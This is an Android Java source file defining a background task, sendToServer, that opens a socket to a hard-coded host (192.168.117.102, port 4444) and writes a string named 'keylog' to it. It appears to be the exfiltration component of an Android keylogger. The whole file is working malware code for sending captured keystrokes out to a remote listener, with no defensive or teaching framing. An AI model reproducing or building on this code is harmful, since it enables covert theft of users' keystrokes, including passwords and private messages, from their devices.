package com.example.project;

import android.os.AsyncTask;
import android.util.Log;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;

public class sendToServer extends AsyncTask<Void, Void, Void> {

    Socket s;
    DataOutputStream dataOutputStream;

    private String keylog;

    public sendToServer(String keylog) {
        this.keylog = keylog;
    }

    @Override
    protected Void doInBackground(Void... voids) {
        try {
            s = new Socket("192.168.117.102", 4444);
            dataOutputStream = new DataOutputStream(s.getOutputStream());
            dataOutputStream.writeUTF(keylog);
            dataOutputStream.flush();
        } catch (UnknownHostException e) {
            Log.e("sendToServer", "Error: Unknown Host", e);
        } catch (IOException e) {
            Log.e("sendToServer", "Error: IO Exception", e);
        } finally {
            try {
                if (dataOutputStream != null) {
                    dataOutputStream.close();
                }
                if (s != null) {
                    s.close();
                }
            } catch (IOException e) {
                Log.e("sendToServer", "Error: Failed to close socket and output stream", e);
            }
        }
        return null;
    }
}
